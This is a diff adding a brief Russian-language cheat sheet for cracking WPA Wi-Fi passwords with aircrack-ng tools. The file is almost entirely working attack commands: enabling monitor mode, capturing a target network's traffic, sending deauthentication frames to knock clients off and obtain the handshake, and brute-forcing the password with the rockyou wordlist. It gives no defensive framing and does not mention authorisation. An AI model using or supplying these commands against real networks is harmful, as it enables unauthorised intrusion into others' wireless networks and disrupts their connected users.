@@ -1,0 +1,25 @@
+1.
+locate rockyou.txt
+cp .. ./Desktop
+cd ./Desktop
+gunzip rockyou.txt.gz
+
+2. 
+airmon-ng check kill - убить процессы
+airmon-ng - посмотреть интерфейсы
+airmon-ng start wlan0 (или другой интерфейс) - запустить интерфейс (в режиме мониторинга)
+airodump-ng wlan0mon - сканировать сети, номер канала и bssid запомнить
+
+3. 
+airodump-ng -с Х --bssid XX:XX:XX:XX:XX:XX -w /root/Desktop/ wlan0mon
+где первый Х - номер канала, bssid - id
+
+aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
+где XX:XX:XX:XX:XX:XX - bssid, YY:YY:YY:YY:YY:YY - station
+
+если появился WPA handshake - пароль перехвачен и сохранен.
+
+4. Брутфорс (перебор)
+aircrack-ng -a2 -b XX:XX:XX:XX:XX:XX -w /root/Desktop/rockyou.txt /root/Desktop/*.cap
+где XX:XX:XX:XX:XX:XX - bssid
+
